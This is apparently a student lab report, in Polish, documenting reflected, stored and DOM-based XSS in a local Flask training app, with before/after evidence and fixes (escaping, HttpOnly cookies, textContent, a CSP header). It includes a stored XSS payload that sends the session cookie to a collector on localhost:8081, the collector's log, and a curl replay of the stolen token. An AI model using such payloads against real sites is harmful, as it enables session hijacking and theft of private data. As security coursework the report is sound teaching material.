# Laboratorium 6 — dowody (ładunki, polecenia, logi)

Wartości ciasteczek skrócone. Środowisko: `docker compose up -d --build` w `pliki-dla-studentow/`, po każdej poprawce `docker compose restart web`.

## Zadanie 1 — XSS odbity

Ładunek: `<script>document.title='XSS-odbity';document.body.style.background='red'</script>`
Adres: `/szukaj?q=%3Cscript%3Edocument.title='XSS-odbity';document.body.style.background='red'%3C/script%3E`

Miejsce błędu — `app.py` (przed poprawką):

```python
html += "<h1>Wyniki wyszukiwania dla: " + fraza + "</h1><ul>"   # wiersz 37
```

PRZED — fragment odpowiedzi (`curl`):

```
<h1>Wyniki wyszukiwania dla: <script>document.title='XSS-odbity';document.body.style.background='red'</script></h1>
```

Weryfikacja w przeglądarce (PRZED): `document.title` = `"XSS-odbity"`, tło `rgb(255, 0, 0)`.

Poprawka:

```python
html += "<h1>Wyniki wyszukiwania dla: " + escape(fraza) + "</h1><ul>"
```

PO — fragment odpowiedzi:

```
<h1>Wyniki wyszukiwania dla: &lt;script&gt;document.title=&#x27;XSS-odbity&#x27;;document.body.style.background=&#x27;red&#x27;&lt;/script&gt;</h1>
```

Przeglądarka (PO): `document.title` = `"Szukaj"`, tło `rgba(0, 0, 0, 0)`.
Wyszukiwanie działa: `/szukaj?q=konsultacje` →
`<li>anna: Witajcie na tablicy ogłoszeń! Konsultacje w piątek o 12:00.</li>`

## Zadanie 2 — XSS zapisany i przejęcie sesji

Ładunek (dodany jako `student`):

```html
<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
```

Na tablicy renderowany surowo (przed poprawką, `{{ tresc|safe }}`):

```
<li><b>student</b>: <img src=x onerror="new Image().src=&#39;http://localhost:8081/?c=&#39;+encodeURIComponent(document.cookie)"></li>
```

Log zbieracza PRZED (Anna otworzyła tablicę w oknie zalogowanym jako anna):

```
docker compose logs zbieracz
ZEBRANO: /?c=session=eyJ1enl0a293bmlrIjoiYW5uYSJ9... (skrócone)
```

Krok 3 — użycie skradzionego tokenu bez hasła:

```
curl.exe -i -b "session=eyJ1enl0a293bmlrIjoiYW5uYSJ9..." http://127.0.0.1:8080/notatka
<h1>Notatka użytkownika anna</h1>
<p>Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).</p>
```

(token dekoduje się do `{"uzytkownik":"anna"}` — okaziciel = dostęp bez hasła)

Poprawka — `app.py` wiersz 10:

```python
app.config["SESSION_COOKIE_HTTPONLY"] = True
```

Nagłówki `Set-Cookie` (`curl -i -d "login=anna&haslo=anna-lab6" .../logowanie`):

```
PRZED:  Set-Cookie: session=eyJ1enl0a293bmlrIjoiYW5uYSJ9...; Path=/
PO:     Set-Cookie: session=eyJ1enl0a293bmlrIjoiYW5uYSJ9...; HttpOnly; Path=/
```

PO (po ponownym zalogowaniu Anny i otwarciu tablicy): `document.cookie` = `""` (puste dla JS), zbieracz bez nowego wpisu, ładunek wyświetlony jako tekst.

## Zadanie 3 — Naprawa i CSP

Szablon `tablica.html` wiersz 11:

```
przed:  <li><b>{{ autor }}</b>: {{ tresc|safe }}</li>
po:     <li><b>{{ autor }}</b>: {{ tresc }}</li>
```

Ładunek DOM: `/podglad#<img src=x onerror="document.title='XSS-DOM'">`
(adres: `/podglad#%3Cimg%20src=x%20onerror=%22document.title='XSS-DOM'%22%3E`)

`podglad.html` — skrypt przeniesiony do pliku zewnętrznego:

```html
<div id="podglad"></div>
<script src="{{ url_for('static', filename='podglad.js') }}"></script>
```

`static/podglad.js`:

```javascript
document.getElementById("podglad").textContent = decodeURIComponent(location.hash.slice(1));
```

Przeglądarka:

```
PRZED (innerHTML): document.title = "XSS-DOM"
PO   (textContent): document.title = "Podgląd ogłoszenia",
                    textContent = <img src=x onerror="document.title='XSS-DOM'">  (dosłownie)
```

Nagłówek CSP — `app.py`:

```python
@app.after_request
def naglowki_bezpieczenstwa(odpowiedz):
    odpowiedz.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"
    )
    return odpowiedz
```

Odpowiedź (`curl -i http://127.0.0.1:8080/`):

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

Test dosłownego tekstu (dodane jako ogłoszenie, odczytane z DOM):

```
Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'
```

wyświetla się dosłownie — `<b>` jako tekst, nie pogrubienie.
